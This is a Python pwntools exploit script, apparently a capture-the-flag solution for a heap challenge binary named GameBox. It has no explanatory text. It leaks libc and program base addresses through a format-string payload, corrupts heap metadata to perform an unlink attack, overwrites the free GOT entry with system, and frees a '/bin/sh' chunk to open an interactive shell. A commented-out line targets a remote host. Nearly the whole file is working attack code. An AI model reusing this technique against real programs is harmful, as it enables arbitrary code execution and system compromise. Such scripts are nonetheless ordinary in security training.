#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./GameBox"
ENV = {"LD_PRELOAD":"./libc.so.6"}

randstra = "\x4e\x57\x4c\x52\x42\x42\x4d\x51\x42\x48\x43\x44\x41\x52\x5a\x4f\x57\x4b\x4b\x59\x48\x49\x44\x44"
randstrb = "\x51\x53\x43\x44\x58\x52\x4a\x4d\x4f\x57\x46\x52\x58\x53\x4a\x59\x42\x4c\x44\x42\x45\x46\x53\x41"
randstrc = "\x52\x43\x42\x59\x4e\x45\x43\x44\x59\x47\x47\x58\x58\x50\x4b\x4c\x4f\x52\x45\x4c\x4c\x4e\x4d\x50"

free_got_off = 0x203018
system_off = 0x45390

p = process(elf)
#p = remote("172.22.224.113", 9999)

def play(size, name, rands):
    p.recvuntil("(E)xit\n")
    p.sendline("P")
    p.recvuntil("Come on boy!Guess what I write:\n")
    p.sendline(rands)
    p.recvuntil("Input your name length:\n")
    p.sendline(str(size))
    p.recvuntil("Input your name:\n")
    p.send(name)

def change(idx, s, rands):
    p.recvuntil("(E)xit\n")
    p.sendline("C")
    p.recvuntil("Input index:\n")
    p.sendline(str(idx))
    p.recvuntil("Input Cookie:\n")
    p.sendline(rands)
    p.recvuntil("input your new name(no longer than old!):\n")
    p.send(s)

def delete(idx, rands):
    p.recvuntil("(E)xit\n")
    p.sendline("D")
    p.recvuntil("Input index:\n")
    p.sendline(str(idx))
    p.recvuntil("Input Cookie:\n")
    p.sendline(rands)

def show():
    p.recvuntil("(E)xit\n")
    p.sendline("S")


payload = "libc_addr:%lx.code_addr:%9$lx."
offsize = 0x98-len(payload)
play(0x98, payload+"A"*offsize, randstra)
show()

p.recvuntil("libc_addr:")
libc_base = int(p.recvuntil(".")[:-1], 0x10)-0x3c6780
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+system_off

p.recvuntil("code_addr:")
code_base = int(p.recvuntil(".")[:-1], 0x10)-0x18d5
log.info("code_base:"+hex(code_base))

free_got_addr = code_base+free_got_off

play(0xf0, "B"*0xf0, randstrb)

payload = p8(0)*0x8
payload += p64(0x91)
payload += p64(code_base+0x2030e8)
payload += p64(code_base+0x2030f0)
payload += "A"*(0x90-len(payload))
payload += p64(0x90)
change(0, payload, randstra)

delete(1, randstrb)

payload = p8(0)*0x18
payload += p64(code_base+0x2030e8)
payload += p64(0x98)
payload += p8(0)*0x20
payload += p64(free_got_addr)
payload += p64(0x8)
change(0, payload, randstra)

change(1, p64(system_addr), p8(0)*0x18)

play(0x8, "/bin/sh\x00", randstrc)

delete(2, randstrc)

p.interactive()
